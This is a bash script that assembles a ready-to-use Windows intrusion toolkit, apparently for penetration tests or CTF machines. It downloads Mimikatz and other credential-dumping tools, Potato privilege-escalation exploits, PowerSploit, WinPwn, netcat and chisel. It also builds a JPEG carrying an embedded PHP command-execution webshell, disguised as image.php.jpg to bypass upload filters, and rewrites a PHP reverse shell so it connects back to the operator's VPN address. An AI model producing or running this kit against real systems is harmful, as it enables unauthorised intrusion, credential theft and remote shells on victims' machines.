#!/bin/bash
# coding:UTF-8

# -------------------------------------------------------------------------------------
#                               WINDOWS HTTP SERVER
#                BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)
# -------------------------------------------------------------------------------------

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : 2.0                                                                
# Details : Download key components...
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------
clear
echo "----------------------------------"
echo "[+] Downloading key files...      "
apt-get install exiftool -y
apt-get install rlwrap -y
clear
echo "----------------------------------"
echo "[+] Downloading key files...      "
echo "[+] Creating directory...         "
mkdir APT &> /dev/null
cd APT &> /dev/null
echo "[+] Downloading Procsdump...      "
wget "https://download.sysinternals.com/files/Procdump.zip" -O Procdump.zip &> /dev/null
unzip Procdump.zip &> /dev/null
rm Procdump.zip &> /dev/null
mv ./Procdump/procdump64.exe ./ &> /dev/null
mv ./Procdump/procdump32.exe ./ &> /dev/null
rm ./Procdump/Eula.txt &> /dev/null
rm ./Procdump/procdump64a.exe &> /dev/null
rmdir Procdump &> /dev/null
echo "[+] Downloading WinPEAS...        "
wget "https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASx64.exe" -O winpeas64.exe &> /dev/null
wget "https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASx86.exe" -O winpeas32.exe &> /dev/null
echo "[+] Downloading SharpHound...     "
wget "https://github.com/BloodHoundAD/BloodHound/raw/master/Ingestors/SharpHound.exe" -O sharphound.exe &> /dev/null
wget "https://github.com/BloodHoundAD/BloodHound/raw/master/Ingestors/SharpHound.ps1" -O sharphound.ps1 &> /dev/null
echo "[+] Downloading Loverly-Potato... "
git clone https://github.com/TsukiCTF/Lovely-Potato.git &> /dev/null
mv ./Lovely-Potato/Invoke-LovelyPotato.ps1 ./lovelypotato.ps1 &> /dev/null
mv ./Lovely-Potato/JuicyPotato-Static.exe ./juicypotato.exe &> /dev/null
mv ./Lovely-Potato/test_clsid.bat ./ &> /dev/null
rm ./Lovely-Potato/README.md &> /dev/null
rm -rf Lovely-Potato &> /dev/null
rm Eula.txt &> /dev/null
wget "https://github.com/antonioCoco/RoguePotato/releases/download/1.0/RoguePotato.zip" -O RoguePotato.zip
unzip RoguePotato.zip
rm RoguePotato.zip
echo "[+] Downloading PowerShell Scripts..."
wget "https://github.com/411Hall/JAWS/raw/master/jaws-enum.ps1" -O jawsenum.ps1 &> /dev/null
wget "https://github.com/besimorhino/powercat/raw/master/powercat.ps1"-O powercat.ps1 &> /dev/null
wget "https://github.com/HarmJ0y/PowerUp/raw/master/PowerUp.ps1" -O powerup.ps1 &> /dev/null
wget "https://github.com/S3cur3Th1sSh1t/WinPwn/raw/master/WinPwn.ps1" -O winpwn.ps1 &> /dev/null
wget "https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Out-Minidump.ps1" -O mimidump.ps1 &> /dev/null
wget "https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1" -O mimilatz.ps1 &> /dev/null
wget "https://github.com/PowerShellMafia/PowerSploit/raw/master/Recon/PowerView.ps1" -O powerview.ps1 &> /dev/null
wget "https://github.com/Kevin-Robertson/Powermad/raw/master/Powermad.ps1" -O powermad.ps1 &> /dev/null
echo "[+] Downloading Various Executables..."
wget "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe" -O rubeus.exe &> /dev/null
wget "https://nmap.org/dist/nmap-7.80-setup.exe" -O nmapsetup.exe &> /dev/null
cp /usr/share/windows-resources/mimikatz/Win32/mimikatz.exe ./mimikatz32.exe &> /dev/null
cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe ./mimikatz64.exe &> /dev/null
cp /usr/share/windows-resources/binaries/nc.exe nc64.exe &> /dev/null
cp /usr/share/windows-resources/binaries/plink.exe plink64.exe &> /dev/null
wget "https://github.com/jpillora/chisel/releases/download/v1.7.2/chisel_1.7.2_windows_amd64.gz" -O chisel.gz &> /dev/null
gunzip chisel.gz &> /dev/null
mv chisel chisel64.exe
wget "https://github.com/jpillora/chisel/releases/download/v1.7.2/chisel_1.7.2_windows_386.gz" -O chisel.gz &> /dev/null
gunzip chisel.gz &> /dev/null
mv chisel chisel32.exe 
echo "[+] Setting up various shells..."
wget "https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php" -O webshell.php &> /dev/null
touch image.jpg &> /dev/null
exiftool -DocumentName="<h1>IMAGE SHELL<br><?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';}  __halt_compiler();?></h1>" image.jpg &> /dev/null
mv image.jpg image.php.jpg &> /dev/null
wget "https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php" -O myshell.php &> /dev/null
ifconfig tun0 | grep 'inet ' | awk '{print $2}' | sed 's/addr://' > file.txt
filename="file.txt" 
while read line
  do 
  sed -i s/127.0.0.1/$line/g myshell.php
done < $filename
echo "-----------------------------------"
echo "All Done!! - Downloads completed..."
echo "-----------------------------------"
cd ..
#Eof
